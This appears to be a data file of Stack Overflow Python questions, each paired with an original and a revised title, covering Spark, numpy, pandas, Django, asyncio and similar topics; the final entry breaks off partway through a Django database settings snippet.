Explain the aggregate functionality in Spark(with Python and Scala)," I am looking for some better explanation of the aggregate functionality that is available via spark in python. The example I have is as follows (using pyspark from Spark 1.2.0 version) Output: I get the expected result (10,4) which is sum of 1+2+3+4 and 4 elements. If I change the initial value passed to the aggregate function to (1,0) from (0,0) I get the following result Output: The value increases by 9. If I change it to (2,0), the value goes to (28,4) and so on.Can someone explain to me how this value is calculated? I expected the value to go up by 1 not by 9, expected to see (11,4) instead I am seeing (19,4).  <code>  sc.parallelize([1,2,3,4]).aggregate( (0, 0), (lambda acc, value: (acc[0] + value, acc[1] + 1)), (lambda acc1, acc2: (acc1[0] + acc2[0], acc1[1] + acc2[1]))) (10, 4) sc.parallelize([1,2,3,4]).aggregate( (1, 0), (lambda acc, value: (acc[0] + value, acc[1] + 1)), (lambda acc1, acc2: (acc1[0] + acc2[0], acc1[1] + acc2[1]))) (19, 4)",Explain the aggregate functionality in Spark (with Python and Scala)
next() doesn't play nice with any/all in py2.7," I ran down a bug today that came about because I was using next() to extract a value, and 'not found' emits a StopIteration.Normally that would halt the program, but the function using next was being called inside an all() iteration, so the all just terminated early and returned True.Is this an expected behavior? Are there style guides that help avoid this kind of thing?Simplified example: <code>  def error(): return next(i for i in range(3) if i==10)error() # fails with StopIterationall(error() for i in range(2)) # returns True",next() doesn't play nice with any/all in python
Strange Python reaction! Please helpme," I've noticed that adding a space to identical strings makes them compare unequal using is, while the non-space versions compare equal. I have read this question about comparing strings with == and is. I think this is a different question because the space character is changing the behavior, not the length of the string. See: Why does adding a space to the string change the result of this comparison? <code>  a = 'abc'b = 'abc'a is b#outputs: Truea = 'abc abc'b = 'abc abc'a is b#outputs: False a = 'abc'b = 'abc'a is b # Truea = 'gfhfghssrtjyhgjdagtaerjkdhhgffdhfdah'b = 'gfhfghssrtjyhgjdagtaerjkdhhgffdhfdah'a is b # True",Why does a space affect the identity comparison of equal strings?
"Strange behavior using ""is"" operator with strings"," I've noticed that adding a space to identical strings makes them compare unequal using is, while the non-space versions compare equal. I have read this question about comparing strings with == and is. I think this is a different question because the space character is changing the behavior, not the length of the string. See: Why does adding a space to the string change the result of this comparison? <code>  a = 'abc'b = 'abc'a is b#outputs: Truea = 'abc abc'b = 'abc abc'a is b#outputs: False a = 'abc'b = 'abc'a is b # Truea = 'gfhfghssrtjyhgjdagtaerjkdhhgffdhfdah'b = 'gfhfghssrtjyhgjdagtaerjkdhhgffdhfdah'a is b # True",Why does a space affect the identity comparison of equal strings?
Why does a space effect the identity comparison of equal strings?," I've noticed that adding a space to identical strings makes them compare unequal using is, while the non-space versions compare equal. I have read this question about comparing strings with == and is. I think this is a different question because the space character is changing the behavior, not the length of the string. See: Why does adding a space to the string change the result of this comparison? <code>  a = 'abc'b = 'abc'a is b#outputs: Truea = 'abc abc'b = 'abc abc'a is b#outputs: False a = 'abc'b = 'abc'a is b # Truea = 'gfhfghssrtjyhgjdagtaerjkdhhgffdhfdah'b = 'gfhfghssrtjyhgjdagtaerjkdhhgffdhfdah'a is b # True",Why does a space affect the identity comparison of equal strings?
How do i redirect user to url in python wsgi?(Not using any framework)," I am trying to develop a small web application using python's WSGI. For example, if a user chooses Google they would be redirected to google.com, if they chose Facebook they'd be redirected to facebook.com, etc. However, when I run this code, I get the following error: <code>  from wsgiref.simple_server import make_serverfrom cgi import parse_qs, escapemain_html = """"""<html><head><title> Welcome to redirection test page </title> </head><body> <form method=""get"" action='/visit'> <input type=radio name='site' value=google> Google <input type=radio name='site' value=facebook> Facebook <input type=submit value=submit> </form></body></html>""""""def main(environ, start_response): response_body = main_html print type(response_body) status = '200 OK' response_headers = [ ('Content-Type','text/html'), ('Content-Length', str(len(response_body))) ] start_response(status, response_headers) return [response_body]def visit(environ, start_response): qs = parse_qs(environ['QUERY_STRING']) dest = qs.ge('site')[0] if dest == 'google': start_response('301 Moved Permanently', [('Location','http://google.com')]) else: start_response('301 Moved Permanently', [('Location','http://facebook.com')]) return [1]def app(environ, start_response): if environ['PATH_INFO'] == '/': return main(environ, start_response) elif environ['PATH_INFO'] == '/visit': return visit(environ, start_response)httpd = make_server('192.168.48.128',8052, app)print 'Serving on port 8052'httpd.serve_forever() Traceback (most recent call last): File ""/usr/lib/python2.7/wsgiref/handlers.py"", line 86, in run self.finish_response() File ""/usr/lib/python2.7/wsgiref/handlers.py"", line 131, in finish_response self.close() File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 33, in close self.status.split(' ',1)[0], self.bytes_sentAttributeError: 'NoneType' object has no attribute 'split'",Redirect a user to url with WSGI (no framework)
How To Resize a Video Clip Python," I want to resize a video clip in python 2.7.For example we give ""movie.mp4"" with 1080p qualityThe result should be ""movie.mp4"" with 360p qualityI Think that there should be solutions with Moviepy. If you know a solution with it.I would be grateful if you answer me. <code> ",How To Resize a Video Clip in Python
How to skip delete confirmation page in Django admin for specify model?," I have a model with a huge amount of data, and Django creates delete confirmation page a very long time. I have to skip this process and delete data without any confirmation. I have tried some solutions from the internet, but it doesn't work - I still see confirmation page.Anyone know how to do that? <code> ",How to skip delete confirmation page in Django admin for specific model?
Python 3: Get file path from tkinter askopenfilename()," I am writing a script to automate changing a particular set of text in one file into a particular set in another with a different name.I want to get the name of the file using the askopenfilename function, but when I try to print the file name, it returns:<_io.TextIOWrapper name='/home/rest/of/file/path/that/I/actually/need.txt' mode='w' encoding='ANSI_X3.4-1968'>I need just the file name because the <_io.TextIOWrapper ...> is not sub scriptable.Any suggestions to remove the extraneous bits? <code> ",Get file path from askopenfilename function in Tkinter
Get file path from tkinter askopenfilename function," I am writing a script to automate changing a particular set of text in one file into a particular set in another with a different name.I want to get the name of the file using the askopenfilename function, but when I try to print the file name, it returns:<_io.TextIOWrapper name='/home/rest/of/file/path/that/I/actually/need.txt' mode='w' encoding='ANSI_X3.4-1968'>I need just the file name because the <_io.TextIOWrapper ...> is not sub scriptable.Any suggestions to remove the extraneous bits? <code> ",Get file path from askopenfilename function in Tkinter
python requests timeout error," I use requests.post(url, headers, timeout=10) and sometimes I received a ReadTimeout exception HTTPSConnectionPool(host='domain.com', port=443): Read timed out. (read timeout=10)Since I already set timeout as 10 seconds, why am I still receiving a ReadTimeout exception? <code> ",Why do I receive a timeout error from Pythons requests module?
More concise code of for-loop in python," In solid mechanics, I often use Python and write code that looks like the following: I do this really often that I start to wonder whether there is a more concise way to do this. The drawback of the current code is: if I comply with PEP8, then I cannot exceed the 79-character-limit per line, and there is not too much space left, especially if this is again in a function of a class. <code>  for i in range(3): for j in range(3): for k in range(3): for l in range(3): # do stuff",How can I make a for-loop pyramid more concise in Python?
TypeError: Type str doesn't support the buffer, Hi all I have this code: And I get the following error: data = data.split('&') TypeError: Type str doesn't support the buffer APIHow to split my string? <code>  data = data.split('&'),TypeError: Type str doesn't support the buffer API when splitting string
How to cast mpmath matrix to numpy ndarray," I'm working with mpmath python library to gain precision during some computations, but i need to cast the result in a numpy native type.More precisely i need to cast an mpmath matrix (that contains mpf object types) in an numpy.ndarray (that contains float types).I have solved the problem with a raw approach: My question is:Is there a better/more elegant/easier/clever way to do it? UPDATE:Reading again and again the mpmath documentation I've found this very useful method: tolist() , it can be used as follows: It seems slightly better and elegant (no for loops needed)Are there better ways to do it? Does my second solution round or chop extra digits? <code>  # My input Matrix:matr = mp.matrix([[ '115.80200375', '22.80402473', '13.69453064', '54.28049263'],[ '22.80402473', '86.14887381', '53.79999432', '42.78548627'],[ '13.69453064', '53.79999432', '110.9695448' , '37.24270321'],[ '54.28049263', '42.78548627', '37.24270321', '95.79388469']])# multiple precision computationD = MPDBiteration(matr)# Create a new ndarray Z = numpy.ndarray((matr.cols,matr.rows),dtype=numpy.float)# I fill it pretty ""manually""for i in range(0,matr.rows): for j in range(0,matr.cols): Z[i,j] = D[i,j] # or float(D[i,j]) seems to work the same Z = np.array(matr.tolist(),dtype=np.float32)",How to properly cast mpmath matrix to numpy ndarray ( and mpmath.mpf to float)
How to cast mpmath matrix to numpy ndarray ( and mpmath.mpf to float)," I'm working with mpmath python library to gain precision during some computations, but i need to cast the result in a numpy native type.More precisely i need to cast an mpmath matrix (that contains mpf object types) in an numpy.ndarray (that contains float types).I have solved the problem with a raw approach: My question is:Is there a better/more elegant/easier/clever way to do it? UPDATE:Reading again and again the mpmath documentation I've found this very useful method: tolist() , it can be used as follows: It seems slightly better and elegant (no for loops needed)Are there better ways to do it? Does my second solution round or chop extra digits? <code>  # My input Matrix:matr = mp.matrix([[ '115.80200375', '22.80402473', '13.69453064', '54.28049263'],[ '22.80402473', '86.14887381', '53.79999432', '42.78548627'],[ '13.69453064', '53.79999432', '110.9695448' , '37.24270321'],[ '54.28049263', '42.78548627', '37.24270321', '95.79388469']])# multiple precision computationD = MPDBiteration(matr)# Create a new ndarray Z = numpy.ndarray((matr.cols,matr.rows),dtype=numpy.float)# I fill it pretty ""manually""for i in range(0,matr.rows): for j in range(0,matr.cols): Z[i,j] = D[i,j] # or float(D[i,j]) seems to work the same Z = np.array(matr.tolist(),dtype=np.float32)",How to properly cast mpmath matrix to numpy ndarray ( and mpmath.mpf to float)
"Why is a**b so much faster than math.pow(a,b)?"," When discussing the question Exponentials in python x.**y vs math.pow(x, y), Alfe stated that there would be no good reason for using math.pow instead of the builtin ** operator in python. timeit shows that math.pow is slower than ** in all cases. What is math.pow() good for anyway? Has anybody an idea where it can be of any advantage then?We tried to convince each other with some timeit arguments an he is the winner so far ;-) -- At least the following timeit results, seem to verify that math.pow is slower than ** in all cases. Output: (ideone-shortcut)Is there a simple explanation for the difference[1] we observe?[1] The performances of math.pow and ** differ by one order of magnitude.Edits:literal arguments instead of variables in titlefootnote that explicitly points on the magnitude of difference <code>  import timeitprint timeit.timeit(""math.pow(2, 100)"",setup='import math')print timeit.timeit(""2.0 ** 100.0"")print timeit.timeit(""2 ** 100"")print timeit.timeit(""2.01 ** 100.01"") 0.3296399116520.03612589836120.03642606735230.0363788604736","Why is 2**100 so much faster than math.pow(2,100)?"
How to count the occurrence of certain item in an ndarray in Python?," In Python, I have an ndarray ythat is printed as array([0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1])I'm trying to count how many 0s and how many 1s are there in this array. But when I type y.count(0) or y.count(1), it says numpy.ndarray object has no attribute countWhat should I do?  <code> ",How to count the occurrence of certain item in an ndarray?
Python no module pip.__main__; error when trying to install a module, I am getting the following error on my Raspberry Pi: No module named pip__main__; 'pip' is a package and cannot be directly executedWhen I type in to the terminal: sudo python3 -m pip install mp3playWhat is causing this and how can I fix it so that I can install the module mp3play? <code> ,Python `no module pip.__main__;` error when trying to install a module
"In Pandas, How can I modify the format of a pivot table (columns) ?"," Following this recipe. I 'pivoted' a dataframe that looks like this: And turned it into this: However, now that I want do to simple calculations between the columns like: I get a KeyError, because after 'pivoting' the column names are datetime.time data. How can I modify my pivoted dataframe, so I can do simple calculations between columns. I guess It means changing the format of the column names from datetime.time to str. <code>  Close2015-02-20 14:00:00 1200.12015-02-20 14:10:00 1199.82015-02-21 14:00:00 1199.32015-02-21 14:10:00 1199.02015-02-22 14:00:00 1198.42015-02-22 14:10:00 1199.7 14:00 14:10 2015-02-20 1200.1 1199.8 2015-02-21 1199.3 1199.0 2015-02-22 1198.4 1199.7 df['Chg'] = df['14:10:00'] - df['14:00:00'] In [1]: df_pivot.columns.tolist()Out [2]: [datetime.time(14, 0), datetime.time(14, 10)]",Change column names in Python Pandas from datetime objects to strings?
Change column names in Python Pandas from datatime objects to strings?," Following this recipe. I 'pivoted' a dataframe that looks like this: And turned it into this: However, now that I want do to simple calculations between the columns like: I get a KeyError, because after 'pivoting' the column names are datetime.time data. How can I modify my pivoted dataframe, so I can do simple calculations between columns. I guess It means changing the format of the column names from datetime.time to str. <code>  Close2015-02-20 14:00:00 1200.12015-02-20 14:10:00 1199.82015-02-21 14:00:00 1199.32015-02-21 14:10:00 1199.02015-02-22 14:00:00 1198.42015-02-22 14:10:00 1199.7 14:00 14:10 2015-02-20 1200.1 1199.8 2015-02-21 1199.3 1199.0 2015-02-22 1198.4 1199.7 df['Chg'] = df['14:10:00'] - df['14:00:00'] In [1]: df_pivot.columns.tolist()Out [2]: [datetime.time(14, 0), datetime.time(14, 10)]",Change column names in Python Pandas from datetime objects to strings?
numpy: what is the logic of argmin() and argmax() functions?," I can not understand the output of argmax and argmin when use with the axis parameter. For example: As you can see, the maximum value is the point (1,1) and the minimum one is the point (0,0). So in my logic when I run:np.argmin(a,axis=0) I expected array([0,0,0,0]) np.argmin(a,axis=1) I expected array([0,0,0]) np.argmax(a,axis=0) I expected array([1,1,1,1]) np.argmax(a,axis=1) I expected array([1,1,1]) What is wrong with my understanding of things? <code>  >>> a = np.array([[1,2,4,7], [9,88,6,45], [9,76,3,4]])>>> aarray([[ 1, 2, 4, 7], [ 9, 88, 6, 45], [ 9, 76, 3, 4]])>>> a.shape(3, 4)>>> a.size12>>> np.argmax(a)5>>> np.argmax(a,axis=0)array([1, 1, 1, 1])>>> np.argmax(a,axis=1)array([3, 1, 1])>>> np.argmin(a)0>>> np.argmin(a,axis=0)array([0, 0, 2, 2])>>> np.argmin(a,axis=1)array([0, 2, 2])",numpy: what is the logic of the argmin() and argmax() functions?
django-custom-user create superuser in migration," I'd like to seed a superuser record in a data migration for a django 1.7 project. I'm using the django-custom-user app. My migration looks like this: When running ./manage.py migrate I get the following error: I see that EmailUserManager does have a create_superuser method. Am I incorrectly invoking the manager's function?Edit:I see the same issue here. Is duplicating all code really the best solution? Seems like at that point I'd be better off using RunSQL and manually performing the inserts.  <code>  # -*- coding: utf-8 -*-from __future__ import unicode_literalsfrom django.db import models, migrationsdef load_data(apps, schema_editor): EmailUser = apps.get_model('custom_user', 'EmailUser') root = EmailUser.objects.create_superuser(email='admin@somesite.com', password='supersecure')class Migration(migrations.Migration): dependencies = [ ('accounts', '0001_initial'), ] operations = [ migrations.RunPython(load_data) ] Running migrations: Applying accounts.0002_initial_data...Traceback (most recent call last): File ""./manage.py"", line 10, in <module> execute_from_command_line(sys.argv) File ""/usr/local/lib/python2.7/site-packages/django/core/management/__init__.py"", line 385, in execute_from_command_line utility.execute() File ""/usr/local/lib/python2.7/site-packages/django/core/management/__init__.py"", line 377, in execute self.fetch_command(subcommand).run_from_argv(self.argv) File ""/usr/local/lib/python2.7/site-packages/django/core/management/base.py"", line 288, in run_from_argv self.execute(*args, **options.__dict__) File ""/usr/local/lib/python2.7/site-packages/django/core/management/base.py"", line 338, in execute output = self.handle(*args, **options) File ""/usr/local/lib/python2.7/site-packages/django/core/management/commands/migrate.py"", line 161, in handle executor.migrate(targets, plan, fake=options.get(""fake"", False)) File ""/usr/local/lib/python2.7/site-packages/django/db/migrations/executor.py"", line 68, in migrate self.apply_migration(migration, fake=fake) File ""/usr/local/lib/python2.7/site-packages/django/db/migrations/executor.py"", line 102, in apply_migration migration.apply(project_state, schema_editor) File ""/usr/local/lib/python2.7/site-packages/django/db/migrations/migration.py"", line 105, in apply operation.database_forwards(self.app_label, schema_editor, project_state, new_state) File ""/usr/local/lib/python2.7/site-packages/django/db/migrations/operations/special.py"", line 117, in database_forwards self.code(from_state.render(), schema_editor) File ""/Users/spoolphiz/work/somesite/accounts/migrations/0002_initial_data.py"", line 14, in load_data root = EmailUser.objects.create_superuser(email='admin@somesite.com', password='f00b@r')AttributeError: 'Manager' object has no attribute 'create_superuser'",Access django-custom-user manager method in migration
Install Anaconda on Ubuntu 12.04 via command line, I would like to install Anaconda on a remote server. The server is running Ubuntu 12.04.I only have access to this server via SSH. How can I install Anaconda via the command line? <code> ,Install Anaconda on Ubuntu (or Linux) via command line
Install Anaconda on Ubuntu via command line, I would like to install Anaconda on a remote server. The server is running Ubuntu 12.04.I only have access to this server via SSH. How can I install Anaconda via the command line? <code> ,Install Anaconda on Ubuntu (or Linux) via command line
How to convert a DataFrame back to normal RDD in pyspark," I need to use the method that is not available on the DataFrame. All of the DataFrame methods refer only to DataFrame results. So then how to create an RDD from the DataFrame data?Note: this is a change (in 1.3.0) from 1.2.0.Update from the answer from @dpangmao: the method is .rdd. I was interested to understand if (a) it were public and (b) what are the performance implications.Well (a) is yes and (b) - well you can see here that there are significant perf implications: a new RDD must be created by invoking mapPartitions :In dataframe.py (note the file name changed as well (was sql.py): <code>  (rdd.)partitionBy(npartitions, custom_partitioner) @propertydef rdd(self): """""" Return the content of the :class:`DataFrame` as an :class:`RDD` of :class:`Row` s. """""" if not hasattr(self, '_lazy_rdd'): jrdd = self._jdf.javaToPython() rdd = RDD(jrdd, self.sql_ctx._sc, BatchedSerializer(PickleSerializer())) schema = self.schema def applySchema(it): cls = _create_cls(schema) return itertools.imap(cls, it) self._lazy_rdd = rdd.mapPartitions(applySchema) return self._lazy_rdd",How to convert a DataFrame back to normal RDD in pyspark?
Got an error with ipython not with python," My initial goal is to open a dll file on Cygwin using ctypes. However I found some issues with it. I dug up to sys.dl which returns an unknown Permission denied only on IPython.With python everything looks fine: With ipython I get the error: I investigated on this using strace. The output log for `IPython is huge, more than 4MB. Fortunately, I identified some weird things: Who is /home/corinna? I have no corinna user in my installation, neither on my Windows. Corinna does not come from my installation. Is it some hard-coded stuff? Now, here is what I get from strace for python: dlopen is returning 0x0 in IPython while it is returning 0x5B9C0000 for python. I notice that cwdstuff::get is raising an error before dlopen is called. EDITI sent a message to Cygwin's mailing list and the answer of Corinna regarding this issue is: This is not Cygwin's fault, AFAICS. Cygwin never loads functions by ordinal. This is also a bit on the lean side as far as information is concerned. One can't see how the process calls dlopen, for instance. Corinna How to solve this issue?My earlier tests using ctypesInitially when I asked my question I was just playing with ctypes. I am working on Cygwin 32-bit and Windows 7. With IPython I got an OSError when I tried to load a dll using cdll.LoadLibrary.  <code>  $ lsmy.dll$ pythonPython 2.7.8 (default, Jul 28 2014, 01:34:03)[GCC 4.8.3] on cygwin>>> import dl>>> dl.open('my.dll')<dl.dl object at 0xfffaa0c0> $ ipythonPython 2.7.8 (default, Jul 28 2014, 01:34:03) In [1]: import dl In [2]: dl.open('my.dll')---------------------------------------------------------------------------error Traceback (most recent call last)<ipython-input-2-c681630fa713> in <module>()----> 1 dl.open('my.dll')error: Permission denied symlink.check(C:\Users\user\Home\projects\foo\my.dll, 0x28AB88) (0x4022) 35 2705178 [main] python2.7 16924 path_conv::check: this->path(C:\Users\user\Home\projects\foo\my.dll), has_acls(1) 37 2705215 [main] python2.7 16924 cwdstuff::get: posix /cygdrive/c/Users/user/Home/projects/foo 32 2705247 [main] python2.7 16924 cwdstuff::get: (C:\Users\user\Home\projects\foo) = cwdstuff::get (0x8006ECF0, 32768, 0, 0), errno 11--- Process 14376, exception c0000138 at 7726163E 3286 2708533 [main] python2.7 16924 seterrno_from_win_error: /home/corinna/src/cygwin/cygwin-1.7.35/cygwin-1.7.35-1.i686/src/src/winsup/cygwin/dlfcn.cc:174 windows error 182 42 2708575 [main] python2.7 16924 geterrno_from_win_error: unknown windows error 182, setting errno to 13 36 2708611 [main] python2.7 16924 dlopen: ret 0x0 symlink.check(C:\Users\user\Home\projects\foo\my.dll, 0x28B728) (0x4022) 26 10440048 [main] python 12604 path_conv::check: this->path(C:\Users\user\Home\projects\foo\my.dll), has_acls(1) 23 10440071 [main] python 12604 cwdstuff::get: posix /cygdrive/c/Users/user/Home/projects/foo 25 10440096 [main] python 12604 cwdstuff::get: (C:\Users\user\Home\projects\foo) = cwdstuff::get (0x8006ECF0, 32768, 0, 0), errno 0 3405 10443501 [main] python 12604 dlopen: ret 0x5B9C0000 ",Permission denied on dl.open() with ipython but not with python
OSError with only ipython and not with python," My initial goal is to open a dll file on Cygwin using ctypes. However I found some issues with it. I dug up to sys.dl which returns an unknown Permission denied only on IPython.With python everything looks fine: With ipython I get the error: I investigated on this using strace. The output log for `IPython is huge, more than 4MB. Fortunately, I identified some weird things: Who is /home/corinna? I have no corinna user in my installation, neither on my Windows. Corinna does not come from my installation. Is it some hard-coded stuff? Now, here is what I get from strace for python: dlopen is returning 0x0 in IPython while it is returning 0x5B9C0000 for python. I notice that cwdstuff::get is raising an error before dlopen is called. EDITI sent a message to Cygwin's mailing list and the answer of Corinna regarding this issue is: This is not Cygwin's fault, AFAICS. Cygwin never loads functions by ordinal. This is also a bit on the lean side as far as information is concerned. One can't see how the process calls dlopen, for instance. Corinna How to solve this issue?My earlier tests using ctypesInitially when I asked my question I was just playing with ctypes. I am working on Cygwin 32-bit and Windows 7. With IPython I got an OSError when I tried to load a dll using cdll.LoadLibrary.  <code>  $ lsmy.dll$ pythonPython 2.7.8 (default, Jul 28 2014, 01:34:03)[GCC 4.8.3] on cygwin>>> import dl>>> dl.open('my.dll')<dl.dl object at 0xfffaa0c0> $ ipythonPython 2.7.8 (default, Jul 28 2014, 01:34:03) In [1]: import dl In [2]: dl.open('my.dll')---------------------------------------------------------------------------error Traceback (most recent call last)<ipython-input-2-c681630fa713> in <module>()----> 1 dl.open('my.dll')error: Permission denied symlink.check(C:\Users\user\Home\projects\foo\my.dll, 0x28AB88) (0x4022) 35 2705178 [main] python2.7 16924 path_conv::check: this->path(C:\Users\user\Home\projects\foo\my.dll), has_acls(1) 37 2705215 [main] python2.7 16924 cwdstuff::get: posix /cygdrive/c/Users/user/Home/projects/foo 32 2705247 [main] python2.7 16924 cwdstuff::get: (C:\Users\user\Home\projects\foo) = cwdstuff::get (0x8006ECF0, 32768, 0, 0), errno 11--- Process 14376, exception c0000138 at 7726163E 3286 2708533 [main] python2.7 16924 seterrno_from_win_error: /home/corinna/src/cygwin/cygwin-1.7.35/cygwin-1.7.35-1.i686/src/src/winsup/cygwin/dlfcn.cc:174 windows error 182 42 2708575 [main] python2.7 16924 geterrno_from_win_error: unknown windows error 182, setting errno to 13 36 2708611 [main] python2.7 16924 dlopen: ret 0x0 symlink.check(C:\Users\user\Home\projects\foo\my.dll, 0x28B728) (0x4022) 26 10440048 [main] python 12604 path_conv::check: this->path(C:\Users\user\Home\projects\foo\my.dll), has_acls(1) 23 10440071 [main] python 12604 cwdstuff::get: posix /cygdrive/c/Users/user/Home/projects/foo 25 10440096 [main] python 12604 cwdstuff::get: (C:\Users\user\Home\projects\foo) = cwdstuff::get (0x8006ECF0, 32768, 0, 0), errno 0 3405 10443501 [main] python 12604 dlopen: ret 0x5B9C0000 ",Permission denied on dl.open() with ipython but not with python
Python log rotation: logrotate.d or RotatingFileHandler," Python has its own RotatingFileHandler which is supposed to automatically rotate log files. As part of a linux application which would need to rotate it's log file every couple of weeks/months, I am wondering if it is any different than having a config file in logrotate.d and using a WatchedFileHandler instead.Is there any difference in how they operate? Is one method safer, more efficient, or considered superior to the other? <code> ",Is there a difference between RotatingFileHandler and logrotate.d + WatchedFileHandler for Python log rotation?
Does Python run out of Memory?," I'm working on Ubuntu 14.04 with Python 3.4 (Numpy 1.9.2 and PIL.Image 1.1.7). Here's what I do: Seems to me like Python runs out of memory all of a sudden. If that is the case - how can I allocate more memory to Python? As I can see from htop my 32GB memory capacity is not even remotely depleated.You may download the TIFF image here.If I create an empty boolean array, set the pixels explicitely and then apply the summation - then it works: But this ""workaround"" is not very satisfactory as copying every pixel takes way too long - maybe there is a faster method? <code>  >>> from PIL import Image>>> import numpy as np>>> img = Image.open(""./tifs/18015.pdf_001.tif"")>>> arr = np.asarray(img)>>> np.shape(arr)(5847, 4133)>>> arr.dtypedtype('bool')# all of the following four cases where I incrementally increase# the number of rows to 700 are done instantly>>> v = arr[1:100,1:100].sum(axis=0)>>> v = arr[1:500,1:100].sum(axis=0)>>> v = arr[1:600,1:100].sum(axis=0)>>> v = arr[1:700,1:100].sum(axis=0)# but suddenly this line makes Python crash>>> v = arr[1:800,1:100].sum(axis=0)fish: Job 1, python3 terminated by signal SIGSEGV (Address boundary error) >>> arr = np.empty((h,w), dtype=bool)>>> arr.setflags(write=True)>>> for r in range(h):>>> for c in range(w):>>> arr.itemset((r,c), img.getpixel((c,r)))>>> v=arr.sum(axis=0)>>> v.mean()5726.8618436970719>>> arr.shape(5847, 4133)",Why does Python crash when I try to sum this numpy array?
what do HWSURFACE and DOUBLEBUF do?," I saw online the use of HWSURFACE|DOUBLEBUF|RESIZABLE to resize the window. It works but I'm not sure what the HWSURFACE and DOUBLEBUF actually do. I know it stands for hardware surface and double buffer, but what they actually help with I have no idea. <code> ",What do HWSURFACE and DOUBLEBUF do?
How to store an array in hdf5 file which is too big to store in memory," Is there any way to store an array in an hdf5 file, which is too big to load in memory?if I do something like this I get a memory error. <code>  f = h5py.File('test.hdf5','w')f['mydata'] = np.zeros(2**32)",How to store an array in hdf5 file which is too big to load in memory?
Get markdown image urls with python," I'm looking for something like this: that returns a list of image URLs from the text: Is there anything available, or do I have to scrape Markdown myself with BeautifulSoup? <code>  data = '''**this is some markdown**blah blah blah![image here](http://somewebsite.com/image1.jpg)![another image here](http://anotherwebsite.com/image2.jpg)'''print get_images_url_from_markdown(data) ['http://somewebsite.com/image1.jpg', 'http://anotherwebsite.com/image2.jpg']",How can I get a list of image URLs from a Markdown file in Python?
Pyinstaller setting icon, When I use the command: All icons do not change to test.ico. Some icons remain as the pyinstaller's default icon.Why?All icon change inwindows 7 32bitwindows 7 64bit (make an exe file OS)Some remain defaultwindows 7 64bit (other PC) <code>  pyinstaller.exe --icon=test.ico -F --noconsole test.py,Pyinstaller setting icons don't change
How to count down in for loop in python?," In Java, I have the following for loop and I am learning Python: My question is simple and probably obvious for most of people who are familiar with Python. I would like to code that 'for' loop in Python. How can I do this?I tried to do the following: I think it should be range(last-1, posn + 1, -1). Am I right?I am thankful to anyone especially who will explain to me how to understand the indices work in Python. <code>  for (int index = last-1; index >= posn; index--) for index in range(last-1, posn, -1):",How to count down in for loop?
Task was destroyed but it is pending in Python asyncio," I use asyncio and beautiful aiohttp. The main idea is that I make request to server (it returns links) and then I want to download files from all links in parallel (something like in an example).Code: But, when I try to run it, I have many ""Download ..."" outputs and And nothing about 'OK + filename'.How can I fix that?  <code>  import aiohttpimport asyncio@asyncio.coroutinedef downloader(file): print('Download', file['title']) yield from asyncio.sleep(1.0) # some actions to download print('OK', file['title'])def run(): r = yield from aiohttp.request('get', 'my_url.com', True)) raw = yield from r.json() tasks = [] for file in raw['files']: tasks.append(asyncio.async(downloader(file))) asyncio.wait(tasks)if __name__ == '__main__': loop = asyncio.get_event_loop() loop.run_until_complete(run()) Task was destroyed but it is pending!","Why am I getting a ""Task was destroyed but it is pending"" error in Python asyncio?"
Migration from Django 1.7 to 1.8," I was migrating from Django 1.7 to 1.8 via following stepsActive virtualenvUninstall Django 1.7Install Django 1.8python manage.py runserverOn execution of step 4 for I am getting the following error. Error seems to be from psycopg2 module and related to autocommit. In the feature removed section of 1.8 documentation I found the following line. I couldn't relate this to the error I got. Can somebody throw light into this?Update:I found out why. Below is my DB connection config. In that there is autocommit=True. On commenting that line, the issue got resolved. But still I want to know why we cannot give autocommit=True option.  <code>  Unhandled exception in thread started by <function wrapper at 0x7f4e473a8230>Traceback (most recent call last): File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/utils/autoreload.py"", line 223, in wrapper fn(*args, **kwargs) File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/core/management/commands/runserver.py"", line 112, in inner_run self.check_migrations() File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/core/management/commands/runserver.py"", line 164, in check_migrations executor = MigrationExecutor(connections[DEFAULT_DB_ALIAS]) File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/migrations/executor.py"", line 19, in __init__ self.loader = MigrationLoader(self.connection) File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/migrations/loader.py"", line 47, in __init__ self.build_graph() File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/migrations/loader.py"", line 180, in build_graph self.applied_migrations = recorder.applied_migrations() File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/migrations/recorder.py"", line 59, in applied_migrations self.ensure_schema() File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/migrations/recorder.py"", line 49, in ensure_schema if self.Migration._meta.db_table in self.connection.introspection.table_names(self.connection.cursor()): File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/backends/base/base.py"", line 162, in cursor cursor = self.make_debug_cursor(self._cursor()) File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/backends/base/base.py"", line 135, in _cursor self.ensure_connection() File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/backends/base/base.py"", line 130, in ensure_connection self.connect() File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/utils.py"", line 97, in __exit__ six.reraise(dj_exc_type, dj_exc_value, traceback) File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/backends/base/base.py"", line 130, in ensure_connection self.connect() File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/backends/base/base.py"", line 119, in connect self.connection = self.get_new_connection(conn_params) File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/django/db/backends/postgresql_psycopg2/base.py"", line 172, in get_new_connection connection = Database.connect(**conn_params) File ""/home/lenovo/Envs/boilerplate/local/lib/python2.7/site-packages/psycopg2/__init__.py"", line 164, in connect conn = _connect(dsn, connection_factory=connection_factory, async=async)django.db.utils.OperationalError: invalid connection option ""autocommit"" the decorators and context managers autocommit, commit_on_success, and commit_manually, defined in django.db.transaction DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'HOST': 'localhost', 'PORT': '5432', 'NAME': 'bp_django_auth', 'USER': 'postgres', 'PASSWORD': 'abcd1234', 'OPTIONS': { ""autocommit"": True, }, 